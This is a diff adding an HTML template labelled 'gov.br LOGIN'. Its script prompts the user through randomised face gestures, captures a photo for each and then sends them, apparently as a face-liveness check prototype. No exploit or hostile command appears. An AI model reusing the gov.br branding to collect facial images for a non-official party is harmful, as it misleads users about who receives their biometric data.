@@ -1,0 +1,73 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+        <meta name="author" content="Hackers DELL Ciclon">
+        <title>gov.br LOGIN</title>
+        <link rel="stylesheet" href="{{ url_for('static', filename='css/bootstrap.min.css') }}">
+        <script type="text/javascript" src="{{ url_for('static', filename='js/p5.min.js') }}"></script>
+        <script type="text/javascript" src="{{ url_for('static', filename='js/p5.dom.min.js') }}"></script>
+        <script type="text/javascript" src="{{url_for('static', filename='js/bootstrap.min.js')}}"></script>
+        <script type="text/javascript" src="{{ url_for('static', filename='js/selfie.js') }}"></script>
+      </head>
+
+      <body class="text-center">
+        <div class="container">
+          <div id="face-action" class="h3 font-weight-normal">PREPARE-SE!</div>
+          <div id="counter" style="display: none;" class="h3 font-weight-normal">100</div>
+          <script charset="utf-8">
+            let start = 0;
+            let end = 100;
+            let time = 3000; //in ms
+            let fps = 30;
+            var counter = 0;
+            function shuffle(array) {
+              var currentIndex = array.length, temporaryValue, randomIndex;
+
+              // While there remain elements to shuffle...
+              while (0 !== currentIndex) {
+
+                // Pick a remaining element...
+                randomIndex = Math.floor(Math.random() * currentIndex);
+                currentIndex -= 1;
+
+                // And swap it with the current element.
+                temporaryValue = array[currentIndex];
+                array[currentIndex] = array[randomIndex];
+                array[randomIndex] = temporaryValue;
+              }
+
+              return array;
+            }
+
+            var gestures = shuffle(["sorrir", "virar rosto para direita", "virar rosto para cima",
+                                "virar rosto para esquerda", "virar rosto para baixo"]).slice(0,3);
+            gestures.push("rosto reto");
+
+            let increment = ((end-start)/time)*fps;
+
+            let timer = setInterval(() => {
+                let valuenow = $('#counter').text();
+                $('#face-action').text(gestures[counter]);
+                $('#counter').text(valuenow - increment);
+                if (parseInt(valuenow) <= start) {
+                    valuenow = 0;
+                    takeShot(gestures[counter]);
+                    counter += 1;
+                    $('#counter').text(end);
+                }
+                if (counter == 4) {
+                    clearInterval(timer);
+                    alert("Processando...");
+                    manda();
+                }
+            }, fps);
+      </script>
+    </div>
+    <div><ul id="ul-resultado"></ul></div>
+
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+  </body>
+</html>
